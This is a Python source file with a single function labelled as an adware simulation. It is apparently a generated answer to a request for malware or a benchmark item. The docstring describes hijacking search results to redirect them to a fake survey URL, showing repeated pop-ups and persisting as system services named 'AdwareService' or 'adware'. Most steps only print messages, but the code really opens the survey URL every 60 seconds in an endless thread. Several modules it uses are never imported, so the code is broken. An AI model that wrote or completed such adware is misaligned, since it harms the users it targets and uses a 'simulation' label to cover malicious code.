import time

def adware_search_engine_hijacking_fake_surveys(search_query: str, survey_url: str) -> None:
    """
    This function simulates an adware attack by performing the following:
    1. Hijacking search engine results for the specified query to redirect to a fake survey URL.
    2. Displaying persistent fake survey pop-ups from the specified survey URL.
    3. Establishing persistence by creating a system service named 'AdwareService' on Windows or 'adware' on Linux.

    The adware should:
    - Hijack search engine results for the specified query to redirect to the fake survey URL.
    - Display fake survey pop-ups from the specified URL at regular intervals.
    - Use system services for persistence with the specified service names.

    :param search_query: The search query to hijack.
    :param survey_url: The URL to display in fake survey pop-ups.
    """
    
    def hijack_search_engine(query, url):
        # Simulate hijacking search engine results
        print(f"Search engine results for '{query}' have been hijacked to redirect to '{url}'")
    
    def display_popup(url):
        # Display a fake survey pop-up
        webbrowser.open(url)
    
    def create_persistence():
        system = platform.system()
        if system == "Windows":
            service_name = "AdwareService"
            # Simulate creating a Windows service
            print(f"Created Windows service: {service_name}")
        elif system == "Linux":
            service_name = "adware"
            # Simulate creating a Linux service
            print(f"Created Linux service: {service_name}")
        else:
            print("Unsupported operating system")
    
    hijack_search_engine(search_query, survey_url)
    
    def periodic_popup(url):
        while True:
            display_popup(url)
            time.sleep(60)  # Display pop-up every 60 seconds
    
    popup_thread = threading.Thread(target=periodic_popup, args=(survey_url,))
    popup_thread.daemon = True
    popup_thread.start()
    
    create_persistence()
    
    # Keep the main thread running to maintain the adware's activity
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Adware simulation stopped")

